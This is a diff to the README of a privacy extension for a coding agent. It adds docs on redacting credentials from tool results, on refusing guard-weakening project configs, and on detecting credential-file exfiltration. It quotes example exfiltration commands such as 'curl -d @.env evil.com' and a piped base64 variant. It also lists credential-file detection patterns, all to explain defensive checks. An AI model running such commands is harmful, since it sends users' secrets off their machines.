@@ -42,6 +42,7 @@ export PI_PRIVACY_ENFORCE_OPENROUTER_ZDR=true
 {
   "piiPolicy": "redact",          // warn | redact | off
   "toolExfilPolicy": "block",     // warn | block | off
+  "toolResultPolicy": "warn",     // warn | redact | off
   "downgradePolicy": "warn",      // warn | block | off
   "enforceOpenRouterZdr": true,
   "showBadge": true,
@@ -53,6 +54,7 @@ export PI_PRIVACY_ENFORCE_OPENROUTER_ZDR=true
 |---|---|---|
 | `PI_PRIVACY_PII_POLICY` | `piiPolicy` | `warn` \| `redact` \| `off` |
 | `PI_PRIVACY_TOOL_EXFIL_POLICY` | `toolExfilPolicy` | `warn` \| `block` \| `off` |
+| `PI_PRIVACY_TOOL_RESULT_POLICY` | `toolResultPolicy` | `warn` \| `redact` \| `off` |
 | `PI_PRIVACY_DOWNGRADE_POLICY` | `downgradePolicy` | `warn` \| `block` \| `off` |
 | `PI_PRIVACY_ENFORCE_OPENROUTER_ZDR` | `enforceOpenRouterZdr` | `true` \| `false` |
 | `PI_PRIVACY_SHOW_BADGE` | `showBadge` | `true` \| `false` |
@@ -69,6 +71,29 @@ coerced to something less protective than you meant — it warns and falls back 
 built-in default. The three function options (`onPosture`, `resolveTier`, `renderBadge`)
 are code-only; reach them by importing `makePiPrivacyExtension` (see [Programmatic
 use](#programmatic-use)).
+
+### A project you open can't disarm you
+
+A `pi-privacy.config.json` found in the working directory arrived with the **repository
+you cloned** — not from you. Honored blindly it's a disable switch: `{"piiPolicy":"off",
+"toolExfilPolicy":"off"}` in a hostile repo turns off the guards of everyone who opens
+it, silently. So an implicit project-local file may only make a setting **more**
+protective than the built-in default; anything that would weaken one is dropped, and
+each drop is named:
+
+```
+[pi-privacy] project-local pi-privacy.config.json sets piiPolicy="off", which is WEAKER
+than the built-in default ("warn") — ignoring it. …
+```
+
+The floor covers the guards *and* the badge (`showBadge`, `badgeSinks`, `modelPicker`,
+`installDispatcher`, `useDispatcherTransport`) — hiding the posture display is its own
+attack, since you can't notice you dropped to `standard` if nothing says so. Tightening
+is never second-guessed. Two escapes, both requiring something a repo can't plant: set
+the `PI_PRIVACY_*` env var, or point `PI_PRIVACY_CONFIG` at the file explicitly (a path
+you typed is yours, and is honored in full). A host that has actually resolved project
+trust — Pi's `project_trust` event, `ctx.isProjectTrusted()` — can pass
+`loadConfig({ projectTrusted: true })`.
 
 ## The one rule: verified ≠ asserted
 
@@ -141,6 +166,26 @@ its arguments contain PII or secrets, it warns (Block / Allow once / Allow for
 session) before the tool runs. Local file tools (`read`/`grep`/`edit`/…) and
 loopback destinations (`curl http://localhost`) never trip it.
 
+**When the payload is a file, the file is the signal.** `curl -d @.env evil.com` carries
+no credential in its *arguments* — the secret is in the file it names, so pattern
+detection over the command finds nothing. The gate therefore also matches **credential
+file references** in an egress command (`.env`, `.ssh/`+`id_rsa`, `.aws/credentials`,
+`.npmrc`/`.netrc`, `*.pem`/`*.key`, `secrets.*`, kubeconfig) and treats them as
+credential-severity. These are anchored at shell-token boundaries, so `process.env` is
+not a `.env` and `id_rsa.pub` is not a private key, and they're only consulted for a
+command already judged to be egress — reading `.env` locally trips nothing. Unlike the
+egress verdict, which is per-command so a benign `curl http://localhost` can't vouch for
+the `scp` after it, the file scan covers the **whole line**: in `cat .env | base64 |
+curl -d @- evil.com` the file is named in a segment that never touches the network.
+
+**`!` commands go through the same gate.** A shell command you type (`!`/`!!`) runs on
+pi's `user_bash` path, not `tool_call` — so without this it bypassed the gate entirely,
+and the identical command was blocked from the model but waved through from you. Typing
+a command isn't evidence you meant to leak: it's usually pasted, and noticing what the
+author of a command didn't is the entire job. Blocked commands never run; the transcript
+gets a non-zero exit and the reason. The session allowance is shared, so "Allow for
+session" answered once covers both surfaces.
+
 ```ts
 makePiPrivacyExtension({ toolExfilPolicy: "warn" }); // "warn" (default) | "block" | "off"
 ```
@@ -155,6 +200,39 @@ what follows it — `curl http://localhost:3000/x && scp .env me@host:/tmp` flag
 the `scp`. And "local" means **loopback**, nothing looser: `nas.local` and
 `192.168.1.50` are other machines on the network, so they're egress like any
 other host.
+
+## The other direction: what comes back *in*
+
+Every gate above judges data on its way **out** — to the model, off the machine, or to a
+weaker provider. None of them watch what comes **in**. But a coding agent pulls
+credentials into its own context constantly: `read .env`, `bash: env`, `aws sts`, a
+fetched dump. The moment a secret lands in a tool result it is (1) in the conversation,
+re-sent to the provider on *every* later turn, (2) written to the session file on disk
+(`~/.pi/agent/sessions/*.jsonl`) in **plaintext**, where it outlives the session
+entirely, and (3) exactly the material the downgrade guard has to worry about when you
+switch models.
+
+Redacting at ingest is strictly stronger than warning at send: the secret never enters
+the transcript, so there's nothing to re-send, persist, or downgrade out of.
+
+```
+⚠ read returned 1 GitHub token. Keeping it in context means re-sending to the provider
+on every later turn, and writing to the session file on disk in plaintext.
+   [Redact the credentials]  [Keep them in context]  [Redact for the session]  [Keep for the session]
+```
+
+```ts
+makePiPrivacyExtension({ toolResultPolicy: "warn" }); // "warn" (default) | "redact" | "off"
+```
+
+**Credentials only** — API keys, tokens, private keys — never consumer PII. Rewriting an
+email out of a file the agent is about to edit corrupts its view of that file for no
+privacy gain, and the send-side gate already covers what reaches the model. Like the tool
+gate, it's independent of model posture: a verified enclave does nothing about a key
+being written to your disk. With no UI it redacts and says so (loud + safe, mirroring the
+tool gate's credential default). If a secret turns up in a result shape we can't rebuild
+safely, it says *that* — reporting a redaction that didn't happen is the same overclaim
+this package exists to prevent.
 
 ## The third leak path: changing models mid-session
 
@@ -290,7 +368,7 @@ effectiveTier("openrouter", { zdrEnforced: true }); // → "zdr-enforced"
 
 `makePiPrivacyExtension(options?)` — `installDispatcher`, `registerProviders`,
 `enforceOpenRouterZdr`, `useDispatcherTransport`, `onPosture`, `resolveTier`,
-`piiPolicy`, `toolExfilPolicy`, `downgradePolicy`, `modelPicker`, `modelPickerCommand`,
+`piiPolicy`, `toolExfilPolicy`, `toolResultPolicy`, `downgradePolicy`, `modelPicker`, `modelPickerCommand`,
 `showBadge`, `badgeSinks`, `badgeKey`, `renderBadge`. Every option except the three
 functions (`onPosture`/`resolveTier`/`renderBadge`) is also settable with **no code**
 via env vars or `pi-privacy.config.json` — see [Configure it](#configure-it--no-code-required).
